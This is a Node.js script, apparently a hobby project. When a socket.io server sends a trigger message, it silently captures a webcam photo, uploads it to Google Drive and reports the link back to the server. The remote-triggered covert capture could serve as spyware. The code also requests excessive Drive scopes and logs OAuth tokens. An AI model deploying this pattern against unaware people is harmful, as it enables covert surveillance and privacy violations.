

var fs = require('fs');
var readline = require('readline');
var google = require('googleapis');
var googleAuth = require('google-auth-library');
var NodeWebcam = require( "node-webcam" );
var socket = require('socket.io-client')('http://localhost:3000');//change ur server address
var SCOPES = ['https://www.googleapis.com/auth/drive.metadata.readonly','https://www.googleapis.com/auth/drive',
'https://www.googleapis.com/auth/drive.appdata','https://www.googleapis.com/auth/drive.file','https://www.googleapis.com/auth/drive.metadata','https://www.googleapis.com/auth/drive.photos.readonly','https://www.googleapis.com/auth/drive.readonly','https://www.googleapis.com/auth/drive.scripts'];
var TOKEN_DIR = (process.env.HOME || process.env.HOMEPATH ||
    process.env.USERPROFILE) + '/.credentials/';
var TOKEN_PATH = TOKEN_DIR + 'quickest.json';
var opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false

};


var opts = {
    callbackReturn: "base64"
};

socket.on('connect', function(){
  console.log("connected")
});

socket.on('echo message', function(data){
  if(data==="Your Facebook ID")
  {
    socket.emit("chat message","A Facebook Message Received.")
    console.log("A Facebook Message Received.")
    var Webcam = NodeWebcam.create( opts );
    Webcam.capture( "3", function( err, data ) {} );
    NodeWebcam.capture( "3", opts, function( err, data ) {
    });
    Webcam.list( function( list ) {
        var anotherCam = NodeWebcam.create( { device: list[ 0 ] } );
    });
      NodeWebcam.capture( "3", opts, function( err, data ) {
      fs.readFile('client_secret.json', function processClientSecrets(err, content) {
        if (err) {
          console.log('Error loading client secret file: ' + err);
          return;
        }
        socket.emit("chat message","Image Captured")
          console.log("Image Captured")
        authorize(JSON.parse(content), createfile);

          });
      });
  }
});








// Load client secrets from a local file.
function authorize(credentials, callback) {
  var clientSecret = credentials.installed.client_secret;
  var clientId = credentials.installed.client_id;
  var redirectUrl = credentials.installed.redirect_uris[0];
  var auth = new googleAuth();
  var oauth2Client = new auth.OAuth2(clientId, clientSecret, redirectUrl);

  // Check if we have previously stored a token.
  fs.readFile(TOKEN_PATH, function(err, token) {
    if (err) {
      getNewToken(oauth2Client, callback);
    } else {
      oauth2Client.credentials = JSON.parse(token);
      console.log(token)
      callback(oauth2Client);
    }
  });
}


function getNewToken(oauth2Client, callback) {
  var authUrl = oauth2Client.generateAuthUrl({
    access_type: 'offline',
    scope: SCOPES
  });
  console.log('Authorize this app by visiting this url: ', authUrl);
  var rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question('Enter the code from that page here: ', function(code) {
    rl.close();
    oauth2Client.getToken(code, function(err, token) {
      if (err) {
        console.log('Error while trying to retrieve access token', err);
        return;
      }
      console.log(token)
      oauth2Client.credentials = token;
      storeToken(token);
      callback(oauth2Client);
    });
  });
}

function storeToken(token) {
  try {
    fs.mkdirSync(TOKEN_DIR);
  } catch (err) {
    if (err.code != 'EEXIST') {
      throw err;
    }
  }
  fs.writeFile(TOKEN_PATH, JSON.stringify(token));
  console.log('Token stored to ' + TOKEN_PATH);
}


function createfile(oauth2Client) {


  var drive = google.drive({
      version: 'v3',
      auth: oauth2Client
  });

  var fullpath = "3.jpg"
  var fileStream;

  try{
      fileStream = fs.createReadStream(fullpath);
  }catch(e){
      return output(Error('file not found'));
  }
  var fileMetadata = {
      'name': "3.jpg",
      "description": "hello"
  };
  var media = {
      mimeType: "image/jpeg",
      body: fileStream
  };
  drive.files.create({
      resource: fileMetadata,
      media: media,
      fields: 'id'
  }, function (err, file) {

      if (err) {
          console.log(err);

      } else {
        var url="https://drive.google.com/uc?export=view&id="+file.id
          console.log("File UPloaded")
          socket.emit("chat message",url)
      }
  });


}
